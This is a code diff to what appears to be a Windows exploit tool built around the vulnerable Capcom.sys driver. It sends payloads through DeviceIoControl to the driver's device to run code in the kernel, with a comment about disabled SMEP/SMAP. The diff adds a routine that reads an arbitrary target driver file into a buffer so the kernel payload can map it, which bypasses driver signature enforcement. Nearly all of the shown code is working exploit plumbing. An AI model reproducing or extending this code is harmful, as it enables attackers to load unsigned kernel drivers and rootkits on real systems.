@@ -1,5 +1,10 @@
 #include "stdafx.h"
 #include "DriverLoader.h"
+#include "Helpers.h"
+
+/// Static buffer that the kernel payload reads the driver (disabled SMEP/SMAP)
+string DriverLoader::TargetDriverPE; 
+
 
 DriverLoader::DriverLoader()
 {
@@ -20,30 +25,6 @@ wstring DriverLoader::GetCapcomDriverPath()
 
 	return drvPath;
 }
-
-// https://github.com/iceb0y/ntdrvldr/blob/master/main.c
-VOID PrintErrorAndExit(
-	wchar_t *Function,
-	ULONG dwErrorCode
-	)
-{
-	LPWSTR Buffer;
-
-	FormatMessageW(FORMAT_MESSAGE_ALLOCATE_BUFFER |
-		FORMAT_MESSAGE_FROM_SYSTEM |
-		FORMAT_MESSAGE_IGNORE_INSERTS,
-		NULL,
-		dwErrorCode,
-		LANG_USER_DEFAULT,
-		(LPWSTR)&Buffer,
-		0,
-		NULL);
-	fwprintf(stderr, L"%s: %ws", Function, Buffer);
-	getchar();
-	exit(dwErrorCode);
-}
-
-
 
 /// Creates a service and loads Capcom.sys into the kernel.
 /// When the driver is loaded, a device is exposed named '\\.\Htsysm72FB'
@@ -101,6 +82,30 @@ PPAYLOADTRAMP DriverLoader::AllocPayloadTrampoline(CAPCOM_USER_FUNC targetFunc)
 	return &payload->TrampData;
 }
 
+void DriverLoader::LoadDriverFromFile(const wstring & filename)
+{
+	stringstream buf;
+	ifstream fstr;
+	fstr.exceptions(ifstream::failbit | ifstream::badbit);
+	try
+	{
+		fstr.open(filename);
+		buf << fstr.rdbuf();
+		fstr.close();
+	}
+	catch (const ifstream::failure& e)
+	{
+		UNREFERENCED_PARAMETER(e);
+		cerr << "Failed to read target driver file: " << stdstrerror(errno) << endl;
+		getchar();
+		exit(-1);
+	}
+
+	string res = buf.str();
+
+	DriverLoader::TargetDriverPE = res;
+}
+
 void DriverLoader::ExecIoCtlWithTrampoline(CAPCOM_USER_FUNC targetFunc)
 {
 	// For passing to DeviceIoControl. The driver doesn't do anything with these.
@@ -118,3 +123,4 @@ void DriverLoader::ExecIoCtlWithTrampoline(CAPCOM_USER_FUNC targetFunc)
 	auto bRes = DeviceIoControl(hCapcomDevice, CAPCOM_DEVICE_IOCTL64, reinterpret_cast<LPVOID>(&payload), 8, &dummyOutBuf, 4, &dummyBytesReturned, nullptr);
 	if (!bRes) PrintErrorAndExit(L"DeviceIoControl", GetLastError());
 }
+
